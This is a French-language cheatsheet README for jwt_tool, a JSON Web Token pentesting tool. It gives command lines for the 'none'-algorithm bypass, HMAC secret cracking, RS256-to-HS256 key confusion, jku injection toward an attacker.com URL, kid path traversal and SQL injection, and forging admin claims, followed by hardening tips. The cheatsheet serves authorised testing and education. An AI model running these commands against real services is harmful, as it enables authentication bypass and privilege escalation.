<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪙 jwt_tool - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```
<p align="center">
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Sécurité Web">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🪙 Puissante boîte à outils Python CLI pour analyser, falsifier, forger, numériser et craquer les jetons Web JSON (JWT)</b>
</p>

---

## 📋 Table des matières

- [Vue d'ensemble et anatomie JWT](#-overview--jwt-anatomie)
- [Installation](#-installation)
- [Analyse et inspection des jetons](#-token-parsing--inspection)
- [Analyse automatisée des vulnérabilités (`-M at`)](#-automated-vulnerability-scanning--m-at)
- [Scénarios d'exploitation courants](#-common-exploitation-scenarios)
  - [Confusion d'algorithme / Aucune attaque (`none`)](#algorithm-confusion--none-attack-none)
  - [Craquage de clé secrète HMAC](#hmac-secret-key-cracking)
  - [Confusion de clés : RS256 à HS256 avec clé publique](#key-confusion-rs256-to-hs256-with-public-key)
  -[Injection d'en-tête : usurpation d'identité JKU, X5U et JWK](#header-injection-jku-x5u--jwk-spoofing)
  -[Injection KID (SQLi & Path Traversal)](#kid-injection-sqli--path-traversal)
- [Réclamations de falsification et de falsification de charge utile](#-payload-falsification--forging-claims)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et durcissement](#-considérations-defensives--durcissement)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et anatomie JWT

Un jeton Web JSON (RFC 7519) se compose de trois segments codés en Base64URL séparés par des points (`.`) :
`header.payload.signature`

1. **En-tête :** Identifie le type de jeton (`typ`) et l'algorithme de signature (`alg`, par exemple, `HS256`, `RS256`, `none`).
2. **Charge utile :** Contient les revendications des utilisateurs (`sub`, `role`, `admin`, `exp`).
3. **Signature :** Hachage de vérification cryptographique empêchant toute falsification côté client.

Créé par **ticarpi**, **jwt_tool** automatise les tests de défauts d'architecture et de mise en œuvre dans les workflows d'authentification JWT dans les API et les applications Web modernes.

---

## 📥Installation
```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```
---

## 🔍 Analyse et inspection des jetons

Décodez et inspectez les paramètres d’en-tête et les réclamations de charge utile :
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```
---

## ⚡ Analyse automatisée des vulnérabilités (`-M at`)

Lancez des analyses automatisées de playbook testant les vulnérabilités connues par rapport à un service Web cible :
```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*Tests exécutés :*
- Suppression de signature (aucune variante d'algorithme)
- Confusion des clés RSA vers HMAC
- Réclamation de falsification (`admin=true`, élévation de privilèges)
- Injection dans les collecteurs `kid`, `jku`, `x5u`
- Gestion des signatures vides

---

## 💥 Scénarios d'exploitation courants

### Confusion d'algorithme / Aucune attaque (`none`)
Lorsque les implémentations backend acceptent des jetons non signés :
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*Variantes testées automatiquement :* `none`, `None`, `NONE`, `nOnE`.

### Crackage de la clé secrète HMAC
Lorsque HS256/HS384/HS512 utilise une phrase secrète faible :
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```
### Confusion de clé : RS256 à HS256 avec clé publique
Si le serveur signe avec RSA (RS256) mais accepte HMAC (HS256) en utilisant son certificat public comme clé HMAC partagée :
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```
### Injection d'en-tête : usurpation d'identité JKU, X5U et JWK
Injection de clés ou d'URL contrôlées par un attaquant :
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```
### Injection KID (SQLi et parcours de chemin)
Si le backend utilise le paramètre d'en-tête `kid` (Key ID) directement dans les requêtes de base de données ou les chemins de fichiers :
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```
---

## ✍️ Réclamations pour falsification et falsification de charge utile

Modifiez les valeurs de revendication spécifiques et annulez le jeton :
```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Décoder et analyser le jeton** | `python3 jwt_tool.py <JWT>` |
| **Analyse de Playbook tout-en-un** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **Cracker le secret HMAC** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **Contourner sans aucun algorithme** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> HS256 Confusion** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **Tamper la charge utile et signer** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| ** Traversée du chemin KID ** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ Considérations défensives et durcissement

1. **Liste blanche stricte des algorithmes :** N'acceptez jamais `none` ou le changement d'algorithme. Vérifiez explicitement les algorithmes attendus (`RS256` uniquement).
2. **Rejetez les clés contrôlées par le client :** Ne faites pas aveuglément confiance aux en-têtes `jku`, `jwk` ou `x5u` à partir d'entrées non fiables sans listes autorisées de domaine strictes.
3. **Utilisez des secrets forts :** Assurez-vous que les clés HMAC contiennent au moins 256 bits d'octets aléatoires cryptographiques à haute entropie.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> jwt_tool est conçu strictement pour les tests d'intrusion autorisés, les évaluations de vulnérabilité des API et la recherche pédagogique. Forger des jetons pour accéder à des systèmes non autorisés sans autorisation écrite est strictement illégal.